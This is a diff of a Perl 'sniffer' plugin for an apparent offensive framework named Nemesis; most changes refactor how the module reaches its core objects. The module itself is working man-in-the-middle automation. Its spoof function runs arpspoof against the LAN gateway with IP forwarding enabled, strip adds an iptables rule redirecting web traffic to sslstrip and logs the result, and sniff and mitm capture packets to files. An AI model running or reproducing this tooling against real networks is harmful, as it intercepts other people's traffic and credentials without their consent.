@@ -2,22 +2,20 @@ package Plugin::sniffer;
 use warnings;
 use Carp qw( croak );
 use Nemesis::Process;
-use Nemesis::Session;
 use Nemesis::Inject;
 my $VERSION = '0.1a';
 my $AUTHOR  = "mudler";
 my $MODULE  = "Sniffer Module";
 my $INFO    = "<www.dark-lab.net>";
-#Public exported functions
-my @PUBLIC_FUNCTIONS =
-	qw(status stop sniff spoof strip mitm)
-	;    #NECESSARY
 
+#Public exported functions
+my @PUBLIC_FUNCTIONS = qw(status stop sniff spoof strip mitm);    #NECESSARY for cli
 nemesis_module;
+
 sub help()
-{    #NECESSARY
+{                                                                 #NECESSARY
 	my $self    = shift;
-	my $IO      = $self->{'core'}->{'IO'};
+	my $IO      = $Init->getIO();
 	my $section = $_[0];
 	$IO->print_title( $MODULE . " Helper" );
 	if ( $section eq "configure" || $section eq "check_installation" )
@@ -54,7 +52,7 @@ sub help()
 sub clear
 {    #NECESSARY - CALLED ON EXIT
 	my $self = shift();
-	my $IO   = $self->{'core'}->{'IO'};
+	my $IO   = $Init->getIO();
 	foreach my $dev ( keys %{ $self->{'process'} } )
 	{
 		foreach my $type ( keys %{ $self->{'process'}->{$dev} } )
@@ -68,9 +66,9 @@ sub clear
 sub mitm
 {
 	my $self       = shift;
-	my $IO         = $self->{'core'}->{'IO'};
-	my $env        = $self->{'core'}->{'env'};
-	my $interfaces = $self->{'core'}->{'interfaces'};
+	my $IO         = $Init->getIO();
+	my $env        = $Init->getEnv();
+	my $interfaces = $Init->getInterfaces();
 	my $dev        = $_[0];
 	$IO->print_title("Mitm - Man in the middle on $dev");
 	$self->sniff($dev);
@@ -91,10 +89,10 @@ sub sniff
 	#
 	#
 	my $self       = shift;
-	my $IO         = $self->{'core'}->{'IO'};
-	my $env        = $self->{'core'}->{'env'};
-	my $Session    = $self->{'core'}->{'Session'};
-	my $interfaces = $self->{'core'}->{'interfaces'};
+	my $IO         = $Init->getIO();
+	my $env        = $Init->getEnv();
+	my $Session    = $Init->getSession();
+	my $interfaces = $Init->getInterfaces();
 	my $code;
 	my $dev = $_[0];
 	my $pcap_file =
@@ -106,9 +104,11 @@ sub sniff
 		. $log_file . ' -w '
 		. $pcap_file
 		. " -P autoadd";
-	my $Process = $self->{'core'}->{'ModuleLoader'}->loadmodule("Process");
-	$Process->set( type => 'daemon',    # forked pipeline
-				   code => $code );
+	my $Process = $Init->getModuleLoader()->loadmodule("Process");
+	$Process->set( type => 'daemon',
+				   code => $code,
+				   Init => $Init
+	);
 	if ( $Process->start() )
 	{
 		$self->{'process'}->{$dev}->{'sniffer'} = $Process;
@@ -129,20 +129,19 @@ sub spoof
 	#  @return	nothing
 	#
 	my $self       = shift;
-	my $IO         = $self->{'core'}->{'IO'};
-	my $env        = $self->{'core'}->{'env'};
-	my $interfaces = $self->{'core'}->{'interfaces'};
-	my $Session    = $self->{'core'}->{'Session'};
+	my $IO         = $Init->getIO();
+	my $env        = $Init->getEnv();
+	my $interfaces = $Init->getInterfaces();
+	my $Session    = $Init->getSession();
 	my $dev        = $_[0];
 	my $forwarded  = $env->ipv4_forward("on");
 	$IO->print_info( "IPV4_FORWARD : " . $forwarded );
 	$IO->print_info( "Detected gateway : " . $interfaces->{'GATEWAY'} );
 	my $code    = 'arpspoof -i ' . $dev . " " . $interfaces->{'GATEWAY'};
-	my $Process = $self->{'core'}->{'ModuleLoader'}->loadmodule("Process");
-	$Process->set( type => 'system',                   # forked pipeline
+	my $Process = $Init->getModuleLoader()->loadmodule("Process");
+	$Process->set( type => 'system',    # forked pipeline
 				   code => $code,
-				   env  => $self->{'core'}->{'env'},
-				   IO   => $IO
+				   Init => $Init
 	);
 	$Process->start() or croak("Can't start the process");
 	$self->{'process'}->{$dev}->{'spoofer'} = $Process;
@@ -152,10 +151,10 @@ sub spoof
 sub strip
 {
 	my $self    = shift;
-	my $output  = $self->{'core'}->{'IO'};
-	my $env     = $self->{'core'}->{'env'};
+	my $output  = $Init->getIO();
+	my $env     = $Init->getEnv();
 	my $dev     = $_[0];
-	my $Session = $self->{'core'}->{'Session'};
+	my $Session = $Init->getSession();
 	$output->print_info("Setting iptables to redirect to sslstrip port..");
 	$output->exec(
 		"iptables -t nat -A PREROUTING -p tcp -i $dev --destination-port 80 -j REDIRECT --to-port 8080"
@@ -163,11 +162,10 @@ sub strip
 	my $strip_file =
 		$Session->new_file( $dev . "-sslstrip-" . $env->time() . ".log" );
 	my $code    = 'sslstrip -l 8080 -a -k -f -w ' . $strip_file;
-	my $Process = $self->{'core'}->{'ModuleLoader'}->loadmodule("Process");
-	$Process->set( type => 'system',                   # forked pipeline
+	my $Process = $Init->getModuleLoader()->loadmodule("Process");
+	$Process->set( type => 'system',     # forked pipeline
 				   code => $code,
-				   env  => $self->{'core'}->{'env'},
-				   IO   => $output,
+				   Init => $Init,
 				   file => $strip_file
 	);
 	$Process->start() or croak("Can't start the process");
@@ -178,8 +176,8 @@ sub strip
 sub status
 {
 	my $self   = shift;
-	my $output = $self->{'core'}->{'IO'};
-	my $env    = $self->{'core'}->{'env'};
+	my $output = $Init->getIO();
+	my $env    = $Init->getEnv();
 	my $process;
 	if ( $_[0] )
 	{
@@ -198,9 +196,9 @@ sub status_device()
 {
 	my $self    = shift;
 	my $dev     = $_[0];
-	my $output  = $self->{'core'}->{'IO'};
-	my $env     = $self->{'core'}->{'env'};
-	my $Session = $self->{'core'}->{'Session'};
+	my $output  = $Init->getIO();
+	my $env     = $Init->getEnv();
+	my $Session = $Init->getSession();
 	foreach my $type ( keys %{ $self->{'process'}->{$dev} } )
 	{
 		$output->process_status( $self->{'process'}->{$dev}->{$type} );
@@ -210,8 +208,8 @@ sub status_device()
 sub stop
 {
 	my $self   = shift;
-	my $output = $self->{'core'}->{'IO'};
-	my $env    = $self->{'core'}->{'env'};
+	my $output = $Init->getIO();
+	my $env    = $Init->getEnv();
 	my $dev    = $_[0];
 	my $group  = $_[1];
 	if ( !defined($dev) )
@@ -239,30 +237,5 @@ sub stop
 	}
 }
 
-sub where
-{
-	my $self   = shift;
-	my $output = $self->{'core'}->{'IO'};
-	my $env    = $self->{'core'}->{'env'};
-	my $path   = $env->whereis( $_[0] );
-	$output->print_info( $_[0] . " bin is at $path" );
-}
-
-sub info
-{
-	my $self = shift;
-	my $IO   = $self->{'core'}->{'IO'};
-	my $env  = $self->{'core'}->{'env'};
-	$IO->print_tabbed("$MODULE v$VERSION ~ $AUTHOR ~ $INFO");
-}
-
-sub check_installation
-{
-	my $self      = shift;
-	my $env       = $self->{'core'}->{'env'};
-	my $IO        = $self->{'core'}->{'IO'};
-	my $workspace = $env->workspace();
-	$IO->print_info( "Workspace: " . $workspace );
-}
 1;
 __END__
